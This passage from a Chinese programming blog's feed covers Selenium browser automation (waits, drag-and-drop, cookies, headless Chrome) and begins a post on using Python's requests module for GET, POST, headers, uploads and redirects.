class="comment">#打开一个网站</span></span><br><span class="line">driver.find_element(By.ID, <span class="string">&#x27;kw&#x27;</span>).send_keys(<span class="string">&#x27;联想&#x27;</span>)  <span class="comment">#搜索框输入selenium</span></span><br><span class="line">driver.find_element(By.ID, <span class="string">&#x27;su&#x27;</span>).click()     <span class="comment"># 点击百度一下</span></span><br><span class="line">time.sleep(<span class="number">30</span>)</span><br><span class="line">driver.back()  <span class="comment">#返回</span></span><br><span class="line">driver.quit() <span class="comment">#退出浏览器</span></span><br><span class="line">driver.close()<span class="comment">#关闭标签</span></span><br><span class="line">driver.forward()  <span class="comment">#后退</span></span><br><span class="line">driver.refresh()  <span class="comment">#刷新</span></span><br></pre></td></tr></table></figure><p><strong>获取页面属性</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">r&#x27;https://www.baidu.com&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(browser.title)<span class="comment"># 网页标题</span></span><br><span class="line"><span class="built_in">print</span>(browser.current_url)<span class="comment"># 当前网址</span></span><br><span class="line"><span class="built_in">print</span>(browser.name)<span class="comment"># 浏览器名称</span></span><br><span class="line"><span class="built_in">print</span>(browser.page_source)<span class="comment"># 网页源码</span></span><br></pre></td></tr></table></figure><p>html例子</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;title-content&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com/s?cl=3<span class="symbol">&amp;amp;</span>tn=baidutop10<span class="symbol">&amp;amp;</span>fr=top1000<span class="symbol">&amp;amp;</span>wd=%E5%90%84%E5%9C%B0%E8%B4%AF%E5%BD%BB%E5%8D%81%E4%B9%9D%E5%B1%8A%E5%85%AD%E4%B8%AD%E5%85%A8%E4%BC%9A%E7%B2%BE%E7%A5%9E%E7%BA%AA%E5%AE%9E<span class="symbol">&amp;amp;</span>rsv_idx=2<span class="symbol">&amp;amp;</span>rsv_dl=fyb_n_homepage<span class="symbol">&amp;amp;</span>sa=fyb_n_homepage<span class="symbol">&amp;amp;</span>hisfilter=1&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;title-content-index c-index-single c-index-single-hot1&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;title-content-title&quot;</span>&gt;</span>各地贯彻十九届六中全会精神纪实<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;index-logo-src&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//www.baidu.com/img/flexible/logo/pc/result.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;到百度首页&quot;</span> <span class="attr">title</span>=<span class="string">&quot;到百度首页&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">news = driver.find_element(By.CLASS_NAME, <span class="string">&#x27;title-content&#x27;</span>) </span><br><span class="line">logo = driver.find_element(By.CLASS_NAME, <span class="string">&#x27;index-logo-src&#x27;</span>) </span><br><span class="line"><span class="built_in">print</span>(news.text)<span class="comment">#获取text值</span></span><br><span class="line"><span class="built_in">print</span>(news.get_attribute(<span class="string">&#x27;href&#x27;</span>))  <span class="comment">#获取栗子中的url</span></span><br><span class="line"><span class="built_in">print</span>(logo.<span class="built_in">id</span>)<span class="comment">#6af39c9b-70e8-4033-8a74-7201ae09d540</span></span><br><span class="line"><span class="built_in">print</span>(logo.location)<span class="comment">#&#123;&#x27;x&#x27;: 490, &#x27;y&#x27;: 46&#125;</span></span><br><span class="line"><span class="built_in">print</span>(logo.tag_name)<span class="comment">#img</span></span><br><span class="line"><span class="built_in">print</span>(logo.size)<span class="comment">#&#123;&#x27;height&#x27;: 129, &#x27;width&#x27;: 270&#125;</span></span><br></pre></td></tr></table></figure><p><strong>单选</strong></p><p>先定位需要单选的某个元素，然后点击一下即可</p><p><strong>多选</strong></p><p>依次定位需要选择的元素，点击即可</p><p><strong>下拉框</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.support.select <span class="keyword">import</span> Select<span class="comment">#导入类</span></span><br></pre></td></tr></table></figure><p><strong>拖拽</strong></p><p>拖拽操作就是指定开始位置和结束位置,类似于滑块验证码.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"></span><br><span class="line">element = webdriver.Chrome()</span><br><span class="line">url = <span class="string">&#x27;https://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&#x27;</span></span><br><span class="line">element.get(url)  </span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">element.switch_to.frame(<span class="string">&#x27;iframeResult&#x27;</span>)  <span class="comment">#选择iframe</span></span><br><span class="line"><span class="comment"># 指定开始位置</span></span><br><span class="line">source = element.find_element(By.ID,<span class="string">&quot;draggable&quot;</span>)</span><br><span class="line"><span class="comment"># 指定结束位置</span></span><br><span class="line">target = element.find_element(By.ID,<span class="string">&quot;droppable&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行元素的拖放操作</span></span><br><span class="line">actions = ActionChains(browser)<span class="comment">#执行操作的对象</span></span><br><span class="line">actions.drag_and_drop(source, target)<span class="comment">#执行拖放</span></span><br><span class="line">actions.perform()</span><br><span class="line"><span class="comment"># 拖拽</span></span><br><span class="line">time.sleep(<span class="number">15</span>)</span><br><span class="line"><span class="comment"># 关闭浏览器</span></span><br><span class="line">element.close()</span><br></pre></td></tr></table></figure><p><strong>悬停</strong></p><p>选择一个位置 , 执行move_to_element()移动到目标位置即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">element = webdriver.Chrome()</span><br><span class="line">url = <span class="string">&#x27;https://www.baidu.com&#x27;</span></span><br><span class="line">element.get(url)  </span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定位悬停的位置</span></span><br><span class="line">move = browser.find_element_by_css_selector(<span class="string">&quot;#form &gt; span.bg.s_ipt_wr.new-pmd.quickdelete-wrap &gt; span.soutu-btn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 悬停操作</span></span><br><span class="line">actions = ActionChains(element)<span class="comment">#执行操作的对象</span></span><br><span class="line">actions.move_to_element(move)<span class="comment">#移动到目标位置</span></span><br><span class="line">actions.perform()</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭浏览器</span></span><br><span class="line">element.close()</span><br></pre></td></tr></table></figure><h3 id="键盘操作"><a href="#键盘操作" class="headerlink" title="键盘操作"></a>键盘操作</h3><p>先定位在操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">send_keys(Keys.BACK_SPACE)<span class="comment">#删除键(BackSpace)</span></span><br><span class="line">send_keys(Keys.SPACE)<span class="comment">#空格键(Space)</span></span><br><span class="line">send_keys(Keys.TAB)<span class="comment">#制表键(TAB)</span></span><br><span class="line">send_keys(Keys.ESCAPE)<span class="comment">#回退键(ESCAPE)</span></span><br><span class="line">send_keys(Keys.ENTER)<span class="comment">#回车键(ENTER)</span></span><br><span class="line">send_keys(Keys.CONTRL,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#全选(Ctrl+A)</span></span><br><span class="line">send_keys(Keys.CONTRL,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#复制(Ctrl+C)</span></span><br><span class="line">send_keys(Keys.CONTRL,<span class="string">&#x27;x&#x27;</span>)<span class="comment">#剪切(Ctrl+X)</span></span><br><span class="line">send_keys(Keys.CONTRL,<span class="string">&#x27;v&#x27;</span>)<span class="comment">#粘贴(Ctrl+V)</span></span><br><span class="line">send_keys(Keys.F1)<span class="comment">#键盘F1</span></span><br><span class="line">send_keys(Keys.F12)<span class="comment">#键盘F12</span></span><br></pre></td></tr></table></figure><h3 id="延时等待"><a href="#延时等待" class="headerlink" title="延时等待"></a>延时等待</h3><p>确保全部节点都加载出来,需要设置延时等待一定时间或者条件.</p><p><strong>强制等待</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.sleep(<span class="number">5</span>) <span class="comment">#延时5秒</span></span><br></pre></td></tr></table></figure><p><strong>隐式等待</strong></p><p><code>implicitly_wait()</code>设置等待时间，如果到时间有元素节点没有加载出来，就会抛出异常</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">driver = webdriver.Chrome()</span><br><span class="line"></span><br><span class="line">driver.implicitly_wait(<span class="number">10</span>)  <span class="comment"># 隐式等待，等待时间10秒</span></span><br><span class="line">driver.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(driver.current_url)</span><br><span class="line"><span class="built_in">print</span>(driver.title)</span><br><span class="line">driver.close()<span class="comment"># 关闭浏览器</span></span><br></pre></td></tr></table></figure><p><strong>显式等待</strong></p><p>设置一个等待时间和一个条件，在规定时间内，每隔一段时间查看下条件是否成立，如果成立那么程序就继续执行，否则就抛出一个超时异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="comment"># 设置等待时间10s</span></span><br><span class="line">wait = WebDriverWait(driver, <span class="number">10</span>)</span><br><span class="line"><span class="comment"># 设置判断条件：等待id=&#x27;kw&#x27;的元素加载完成</span></span><br><span class="line"><span class="built_in">input</span> = wait.until(EC.presence_of_element_located((By.ID, <span class="string">&#x27;kw&#x27;</span>)))</span><br><span class="line"><span class="comment"># 在关键词输入：关键词</span></span><br><span class="line"><span class="built_in">input</span>.send_keys(<span class="string">&#x27;Python&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭浏览器</span></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">driver.close()</span><br></pre></td></tr></table></figure><p><strong>其他等待条件</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断标题是否和预期的一致</span></span><br><span class="line">title_is</span><br><span class="line"><span class="comment"># 判断标题中是否包含预期的字符串</span></span><br><span class="line">title_contains</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断指定元素是否加载出来</span></span><br><span class="line">presence_of_element_located</span><br><span class="line"><span class="comment"># 判断所有元素是否加载完成</span></span><br><span class="line">presence_of_all_elements_located</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断某个元素是否可见. 可见代表元素非隐藏，并且元素的宽和高都不等于0，传入参数是元组类型的locator</span></span><br><span class="line">visibility_of_element_located</span><br><span class="line"><span class="comment"># 判断元素是否可见，传入参数是定位后的元素WebElement</span></span><br><span class="line">visibility_of</span><br><span class="line"><span class="comment"># 判断某个元素是否不可见，或是否不存在于DOM树</span></span><br><span class="line">invisibility_of_element_located</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断元素的 text 是否包含预期字符串</span></span><br><span class="line">text_to_be_present_in_element</span><br><span class="line"><span class="comment"># 判断元素的 value 是否包含预期字符串</span></span><br><span class="line">text_to_be_present_in_element_value</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断frame是否可切入，可传入locator元组或者直接传入定位方式：id、name、index或WebElement</span></span><br><span class="line">frame_to_be_available_and_switch_to_it</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断是否有alert出现</span></span><br><span class="line">alert_is_present</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断元素是否可点击</span></span><br><span class="line">element_to_be_clickable</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断元素是否被选中,一般用在下拉列表，传入WebElement对象</span></span><br><span class="line">element_to_be_selected</span><br><span class="line"><span class="comment"># 判断元素是否被选中</span></span><br><span class="line">element_located_to_be_selected</span><br><span class="line"><span class="comment"># 判断元素的选中状态是否和预期一致，传入参数：定位后的元素，相等返回True，否则返回False</span></span><br><span class="line">element_selection_state_to_be</span><br><span class="line"><span class="comment"># 判断元素的选中状态是否和预期一致，传入参数：元素的定位，相等返回True，否则返回False</span></span><br><span class="line">element_located_selection_state_to_be</span><br><span class="line"><span class="comment">#判断一个元素是否仍在DOM中，传入WebElement对象，可以判断页面是否刷新了</span></span><br><span class="line">staleness_of</span><br></pre></td></tr></table></figure><h3 id="多窗口标签切换"><a href="#多窗口标签切换" class="headerlink" title="多窗口标签切换"></a>多窗口标签切换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">driver = webdriver.Firefox()</span><br><span class="line">driver.get(<span class="string">&quot;https://movie.douban.com&quot;</span>)<span class="comment">#我们先打开一个网页</span></span><br><span class="line">newwindow = <span class="string">&#x27;window.open(&quot;https://www.baidu.com&quot;)&#x27;</span><span class="comment">#浏览器 新窗口打开连接</span></span><br><span class="line">driver.execute_script(newwindow)</span><br><span class="line">driver.switch_to_window(driver.window_handles[<span class="number">1</span>]) <span class="comment">#移动句柄，对新打开页面进行操作</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">&quot;&quot;</span>)<span class="comment">#具体操作</span></span><br><span class="line">driver.close()<span class="comment">#关闭该新打开的页面</span></span><br><span class="line">driver.switch_to_window(driver.window_handles[<span class="number">0</span>]) <span class="comment">#不关闭，要移动到上一个页面，我们要移动句柄</span></span><br></pre></td></tr></table></figure><h3 id="运行JavaScript"><a href="#运行JavaScript" class="headerlink" title="运行JavaScript"></a>运行JavaScript</h3><p>滑动,向下滑动等操作,运行javascript</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将页面滚动条滑到底部</span></span><br><span class="line">browser.execute_script(<span class="string">&#x27;window.scrollTo(0,document.body.scrollHeight)&#x27;</span>) </span><br><span class="line">browser.execute_script(<span class="string">&#x27;alert(&quot;To Bottom&quot;)&#x27;</span>)<span class="comment">//运行js代码</span></span><br><span class="line"><span class="comment">//向下滑动滚动条，跳转到目标元素处</span></span><br><span class="line">driver.execute_script(<span class="string">&quot;arguments[0].scrollIntoView();&quot;</span>, el)</span><br><span class="line"><span class="comment">//向上滑动滚动条，跳转到目标元素处</span></span><br><span class="line">driver.execute_script(<span class="string">&quot;arguments[0].scrollIntoView(false);&quot;</span>, el)</span><br></pre></td></tr></table></figure><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p><code>Cookie</code>的增删改查</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()<span class="comment"># 知乎发现页</span></span><br><span class="line">browser.get(<span class="string">&#x27;https://www.zhihu.com/explore&#x27;</span>) <span class="comment"># 获取cookie</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Cookies的值：<span class="subst">&#123;browser.get_cookies()&#125;</span>&#x27;</span>)<span class="comment"># 添加cookie</span></span><br><span class="line">browser.add_cookie(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;才哥&#x27;</span>, <span class="string">&#x27;value&#x27;</span>:<span class="string">&#x27;帅哥&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;添加后Cookies的值：<span class="subst">&#123;browser.get_cookies()&#125;</span>&#x27;</span>)<span class="comment"># 删除cookie</span></span><br><span class="line">browser.delete_all_cookies()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;删除后Cookies的值：<span class="subst">&#123;browser.get_cookies()&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Headless方式启动"><a href="#Headless方式启动" class="headerlink" title="Headless方式启动"></a>Headless方式启动</h3><p>官方文档中介绍，mac和linux环境要求chrome版本是59+，而windows版本的chrome要求是60+，同时chromedriver要求2.30+版本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"></span><br><span class="line">chrome_options = webdriver.ChromeOptions()</span><br><span class="line"><span class="comment"># 使用headless无界面浏览器模式</span></span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>) //增加无界面选项</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>) //如果不加这个选项，有时定位会出现问题</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动浏览器，获取网页源代码</span></span><br><span class="line">browser = webdriver.Chrome(chrome_options=chrome_options)</span><br><span class="line">mainUrl = <span class="string">&quot;https://www.taobao.com/&quot;</span></span><br><span class="line">browser.get(mainUrl)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;browser text = <span class="subst">&#123;browser.page_source&#125;</span>&quot;</span>)</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置:&quot;&gt;&lt;/a&gt;环境配置:&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;chromedriver&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Windows下需要放到Chrome安装目录,</summary>
      
    
    
    
    
    <category term="编程" scheme="https://bstark.me/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>python 常见基础模块的使用</title>
    <link href="https://bstark.me/posts/17098/"/>
    <id>https://bstark.me/posts/17098/</id>
    <published>2022-02-08T12:54:52.000Z</published>
    <updated>2022-04-01T06:48:57.555Z</updated>
    
    <content type="html"><![CDATA[<h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><p>默认会对url进行编码.</p><p><strong>get请求</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;11&quot;</span>,<span class="string">&quot;uid&quot;</span>:<span class="string">&quot;888&quot;</span>&#125;</span><br><span class="line">r = requests.get(<span class="string">&#x27;https://api.github.com/events&#x27;</span>, params=payload)</span><br><span class="line">r = requests.get(<span class="string">&quot;http://httpbin.org/get&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response.status_code)  <span class="comment"># 打印状态码</span></span><br><span class="line"><span class="built_in">print</span>(response.url)          <span class="comment"># 打印请求url</span></span><br><span class="line"><span class="built_in">print</span>(response.headers)      <span class="comment"># 打印头信息</span></span><br><span class="line">r.headers[<span class="string">&#x27;Content-Type&#x27;</span>]    <span class="comment"># 访问响应头信息</span></span><br><span class="line"><span class="built_in">print</span>(response.cookies)      <span class="comment"># 打印cookie信息</span></span><br><span class="line"><span class="built_in">print</span>(response.text)         <span class="comment">#以文本形式打印网页源码</span></span><br><span class="line"><span class="built_in">print</span>(response.content)      <span class="comment">#以字节流形式打印</span></span><br><span class="line">bb = <span class="built_in">open</span>(<span class="string">&quot;content.txt&quot;</span>,<span class="string">&quot;ab+&quot;</span>)</span><br><span class="line">bb.write(response.content)</span><br></pre></td></tr></table></figure><p><strong>post请求</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;i&quot;</span>:<span class="string">&quot;%E5%A5%BD%E7%9A%84&quot;</span>,</span><br><span class="line">    <span class="string">&quot;from&quot;</span>:<span class="string">&quot;AUTO&quot;</span>,</span><br><span class="line">    <span class="string">&quot;to&quot;</span>:<span class="string">&quot;AUTO&quot;</span>,</span><br><span class="line">    <span class="string">&quot;smartresult&quot;</span>:<span class="string">&quot;dict&quot;</span>,</span><br><span class="line">    <span class="string">&quot;client&quot;</span>:<span class="string">&quot;fanyideskweb&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://fanyi.youdao.com/translate_o?smartresult=dict&amp;smartresult=rule&quot;</span></span><br><span class="line">r = requests.post(url,data=payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><strong>json请求</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;https://api.github.com/some/endpoint&#x27;</span></span><br><span class="line">payload = &#123;<span class="string">&#x27;some&#x27;</span>: <span class="string">&#x27;data&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, json=payload)</span><br></pre></td></tr></table></figure><p><strong>设置编码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r.encoding<span class="comment">#返回编码</span></span><br><span class="line">r.encoding = <span class="string">&#x27;ISO-8859-1&#x27;</span><span class="comment">#设置编码</span></span><br></pre></td></tr></table></figure><p><strong>原始请求</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">&#x27;https://api.github.com/events&#x27;</span>, stream=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><strong>自定义请求头</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;https://api.github.com/some/endpoint&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;my-app/0.0.1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url, headers=headers)</span><br></pre></td></tr></table></figure><p><strong>文件上传</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;report.xls&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line">r.text</span><br></pre></td></tr></table></figure><p><strong>携带Cookie</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://httpbin.org/cookies&#x27;</span></span><br><span class="line">cookies = <span class="built_in">dict</span>(php_session=<span class="string">&#x27;working&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, cookies=cookies)</span><br><span class="line">r.text</span><br></pre></td></tr></table></figure><p><strong>重定向</strong></p><p>requests 默认跟踪重定向,使用<strong>allow_redirects=False</strong>可以禁用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">&#x27;http://github.com&#x27;</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">r.status_code</span><br><span class="line"></span><br><span class="line">r.history</span><br></pre></td></tr></table></figure><p><strong>代理</strong></p><p>http代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 